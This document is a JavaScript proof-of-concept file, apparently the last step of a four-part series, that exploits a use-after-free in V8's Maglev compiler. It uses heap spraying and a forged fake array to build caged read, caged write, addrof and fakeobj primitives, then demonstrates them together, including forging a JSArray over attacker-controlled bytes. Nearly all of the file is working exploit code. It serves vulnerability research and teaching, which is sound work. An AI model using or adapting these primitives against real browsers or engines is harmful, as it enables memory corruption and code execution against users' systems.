// ============================================================================
//  Maglev primitives -- STEP 4 / 4 -- fakeobj
//
//     1_caged_read.js                    trigger -> UAF -> fake array -> read
//     2_caged_write.js                   + caged write
//     3_addrof.js                        + addrof
//     4_fakeobj.js      <-- YOU ARE HERE   + fakeobj   (all four -- == poc3.js)
//
//  Same engine + read/write + marker array as step 3. NEW this step (*): fakeobj,
//  the inverse of addrof -- write a chosen address into the marker slot and read
//  it back as a JS object reference. That completes the set, so this final file
//  verifies all four primitives together. Engine comments are terse; see steps
//  1-3 / ../poc3.js.
//
//  Run:   d8 --allow-natives-syntax --maglev --no-turbofan 4_fakeobj.js
// ============================================================================

function log(s)       { print(s); }
function ok(s)        { print('  [ok]   ' + s); }
function step(s)      { print('\n=== ' + s + ' ==='); }
function hex(x)       { return '0x' + (x >>> 0).toString(16); }
function die(s)       { print('[FAIL] ' + s); throw new Error(s); }
function assert(c, s) { if (!c) die(s); }

const punF = new Float64Array(1);
const punU = new Uint32Array(punF.buffer);
const punI = new Int32Array(punF.buffer);
function pack(lo, hi) { punU[0] = lo >>> 0; punU[1] = hi >>> 0; return punF[0]; }
const hnSrc = new Float64Array(1); hnSrc[0] = 11.0;

const HN_MAP = 0x515, EMPTY_FA = 0x7bd, DOUBLE_MAP = 0x0100cf51;
const MARKER = 0x1badc0de, MARKER_TAG = (MARKER << 1) >>> 0;

let aD1=0;aD1=0x40000000;let bD1=11;var cD1=0;cD1=1;
let aD2=0;aD2=0x40000000;let bD2=11;var cD2=0;cD2=1;
let aD3=0;aD3=0x40000000;let bD3=11;var cD3=0;cD3=1;
let aT =0;aT =0x40000000;let bT =11;var cT =0;cT =1;
function decoy1(x)  { aD1 = x; bD1 = x; cD1 = x; }
function decoy2(x)  { aD2 = x; bD2 = x; cD2 = x; }
function decoy3(x)  { aD3 = x; bD3 = x; cD3 = x; }
function trigger(x) { aT  = x; bT  = x; cT  = x;  }
function warm(n)    { for (let i = 0; i < n; i++) { decoy1(11); decoy2(11); decoy3(11); trigger(11); } }

function readWord(arr, off) {
  punF[0] = arr[((off & ~7) - 8) >>> 3];
  return (off & 4) ? punI[1] : punI[0];
}
function writeWord(arr, off, v) {
  const i = ((off & ~7) - 8) >>> 3;
  punF[0] = arr[i];
  if (off & 4) punI[1] = v | 0; else punI[0] = v | 0;
  arr[i] = punF[0];
}
function findSentinel(arr, lo, hi) {
  for (let i = lo; i < hi; i++) {
    punF[0] = arr[i];
    if (punI[0] === (MARKER_TAG | 0)) return i << 1;
    if (punI[1] === (MARKER_TAG | 0)) return (i << 1) | 1;
  }
  return -1;
}

let altObj = {}, objArr;

const ELEMS = 256, NSPRAY = 600;
let spray = new Array(NSPRAY), seaArr;

(function warmUp1() { warm(3000); let j = 0; for (let i = 0; i < 1000000; i++) j += i; warm(1000); })();

(function buildSpray() {
  seaArr = [pack(HN_MAP, HN_MAP)];
  for (let e = 1; e < ELEMS; e++) seaArr.push(seaArr[0]);
  for (let s = 0; s < NSPRAY; s++) spray[s] = seaArr.slice();
})();

(function warmUp2() {
  warm(5000); for (let w = 0; w < 5000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
  let j = 0; for (let i = 0; i < 2000000; i++) j += i;
  warm(2000); for (let w = 0; w < 2000; w++) { findSentinel(seaArr, 0, 256); readWord(seaArr, 16); }
})();

step('STEP 4  Trigger, reclaim, forge a fake array, widen to a cage window');

trigger(hnSrc[0]);

const CHURN_PER_ROUND = 1100, CHURN_ROUNDS = 20;
let churnArrs = new Array(CHURN_PER_ROUND * CHURN_ROUNDS), churnCount = 0;
(function churn() {
  for (let r = 0; r < CHURN_ROUNDS; r++) {
    for (let s = 0; s < CHURN_PER_ROUND; s++) churnArrs[churnCount++] = seaArr.slice();
    if (typeof cT !== 'number') return;
    punF[0] = cT; if (punU[1] !== 0x40260000) return;
  }
})();
assert(typeof cT === 'number', 'reclaim miss (cT on a non-number header)');
punF[0] = cT;
assert(punU[0] === HN_MAP && punU[1] === HN_MAP, 'reclaim miss: cT reads ' + hex(punU[1]) + '_' + hex(punU[0]));
ok('cT dangles into the 0x515 sea (after ' + churnCount + ' churn arrays)');

const probeDbl = pack(HN_MAP, 0x517), seaDbl = pack(HN_MAP, HN_MAP);
let elemIdx = -1, align = -1;
(function findElement() {
  for (let k = 0; k < ELEMS; k++) {
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = probeDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = probeDbl;
    if (typeof cT !== 'number') { elemIdx = k; align = 4; return; }
    punF[0] = cT;
    if (punU[0] === 0x517) { elemIdx = k;     align = 0; return; }
    if (punU[1] === 0x517) { elemIdx = k - 1; align = 4; return; }
    for (let s = 0; s < NSPRAY; s++)     spray[s][k]     = seaDbl;
    for (let s = 0; s < churnCount; s++) churnArrs[s][k] = seaDbl;
  }
})();
assert(elemIdx >= 0, 'could not locate cT within the spray');

let arrIdx = -1, srcPool = null;
(function findSource() {
  for (let s = 0; s < NSPRAY; s++)     spray[s][elemIdx]     = probeDbl;
  for (let s = 0; s < churnCount; s++) churnArrs[s][elemIdx] = probeDbl;
  if (align === 0) {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl; punF[0] = cT;
      if (punI[0] !== 0x517) { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  } else {
    for (let s = 0; s < churnCount; s++) {
      churnArrs[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = churnArrs; return; }
      churnArrs[s][elemIdx] = probeDbl;
    }
    for (let s = 0; s < NSPRAY; s++) {
      spray[s][elemIdx] = seaDbl;
      if (typeof cT === 'number') { arrIdx = s; srcPool = spray; return; }
      spray[s][elemIdx] = probeDbl;
    }
  }
})();
assert(arrIdx >= 0, 'could not identify cT source array');
ok('cT overlaps ' + (srcPool === churnArrs ? 'churnArrs' : 'spray') + '[' + arrIdx + '] element [' + elemIdx + '] +' + align);

function forgeArray(map, properties, elements, length) {
  const a = srcPool[arrIdx];
  if (align === 0) {
    a[elemIdx]     = pack(map, properties);
    a[elemIdx + 1] = pack(elements, length);
  } else {
    a[elemIdx]     = pack(HN_MAP, map);
    a[elemIdx + 1] = pack(properties, elements);
    a[elemIdx + 2] = pack(length, HN_MAP);
  }
}

forgeArray(DOUBLE_MAP, EMPTY_FA, EMPTY_FA, 0);
cT[0] = 1.1;
punF[0] = srcPool[arrIdx][elemIdx + 1];
let anchor = (align === 0 ? punI[0] : punI[1]) - 1;
assert(anchor > 0 && cT[0] === 1.1, 'anchor leak failed (' + hex(anchor) + ')');
ok('memory anchor = ' + hex(anchor));

objArr = [altObj, MARKER];
forgeArray(DOUBLE_MAP, EMPTY_FA, 1, 0x7ffffffe);
function cageRead(off)     { return readWord(cT, off) >>> 0; }
function cageWrite(off, v) { writeWord(cT, off, v); }

let objSlot = -1;
{
  let lo = (anchor & ~7) >>> 3, hi = ((anchor + 1024) & ~7) >>> 3, i = lo;
  while (i < hi) {
    let h = findSentinel(cT, i, hi);
    if (h < 0) break;
    let cand = (h & 1) ? ((h >>> 1) * 8 + 12 - 4) : ((h >>> 1) * 8 + 8 - 4);
    i = (h >>> 1) + 1;
    let before = cageRead(cand);
    if ((before & 1) !== 1) continue;
    objArr[0] = objArr;
    let after = cageRead(cand);
    objArr[0] = altObj;
    if (after !== before && (after & 1) === 1) { objSlot = cand; break; }
  }
}
assert(objSlot >= 0, 'marker scan failed near anchor ' + hex(anchor));
function addrOf(o) { objArr[0] = o; return cageRead(objSlot) - 1; }
ok('addrof online (objArr element[0] @ ' + hex(objSlot) + ')');

// * NEW THIS STEP * -----------------------------------------------------------
// fakeobj: write a tagged address into the marker slot, then read that slot as a
// normal JS value -- V8 hands us back a live object living at the address we chose.
function fakeObj(a) { cageWrite(objSlot, (a | 1) >>> 0); return objArr[0]; }   // PRIMITIVE 4
ok('fakeobj online');

// -- verify all four primitives together (this file completes the set) --------
step('DEMONSTRATION  all four primitives');

// addrof vs the address %DebugPrint reports.
let victim = { tag: 0x41414141 };
log('  %DebugPrint(victim) prints the real address next:');
%DebugPrint(victim);
log('  addrOf(victim) = ' + hex(addrOf(victim)) + '   (low bits match the address above)');

// caged read: map word at a real double array == DOUBLE_MAP.
let probe = [1.1, 2.2, 3.3, 4.4];
let pa = addrOf(probe);
assert(cageRead(pa) === DOUBLE_MAP, 'caged read wrong');
ok('caged read : map@addrOf([..]) = ' + hex(cageRead(pa)) + ' === DOUBLE_MAP');

// caged write: change probe.length (a Smi at object offset +0xc) via the cage.
let len0 = probe.length;
cageWrite(pa + 0xc, 0x1234 << 1);
assert(probe.length === 0x1234, 'caged write wrong');
ok('caged write: probe.length ' + len0 + ' -> ' + probe.length + ' (=0x1234)');
cageWrite(pa + 0xc, 4 << 1);

// fakeobj inverts addrof.
assert(fakeObj(addrOf(probe)) === probe, 'fakeObj round-trip failed');
ok('fakeobj    : fakeObj(addrOf(probe)) === probe');

// fakeobj type confusion: materialize a JSArray over bytes we authored -- the
// lever the full exploit uses to forge, e.g., a fake ExternalString.
//   container.elements (FixedDoubleArray) is at obj+8; -1 untags it -> `fda`.
//   The fake JSArray header goes in fda's first double, fda+8 (FDA header = map+
//   length = 8 bytes), spanning fda+8 .. fda+8+15 = [map, properties, elements,
//   length]. We point its `elements` at fda+0x18 (= fda+8 + 16, just past the fake
//   header, |1 to tag it) so the trailing doubles become the fake backing store.
let container = [1.1, 2.2, 3.3, 4.4];
let fda = (cageRead(addrOf(container) + 8) - 1) >>> 0;
cageWrite(fda + 8 + 0, DOUBLE_MAP);       cageWrite(fda + 8 + 4, EMPTY_FA);        // map | properties
cageWrite(fda + 8 + 8, fda + 0x18 + 1);   cageWrite(fda + 8 + 12, 2 << 1);         // elements | length(2)
let fakeLen = fakeObj(fda + 8).length;
objArr[0] = altObj;                                // drop the fake object at once
ok('fakeobj    : forged a JSArray over controlled bytes, fake.length = ' + fakeLen);

(function cleanup() {
  srcPool[arrIdx][elemIdx]     = seaDbl;
  srcPool[arrIdx][elemIdx + 1] = seaDbl;
  if (align) srcPool[arrIdx][elemIdx + 2] = seaDbl;
  objArr[0] = altObj;
  cT = 0;
})();

log('\n================================================================');
log(' ALL FOUR PRIMITIVES VERIFIED: caged read / caged write / addrof / fakeobj');
log(' (built up across primitives/1..4; == Stage 1 of poc.html / poc3.js)');
log('================================================================');
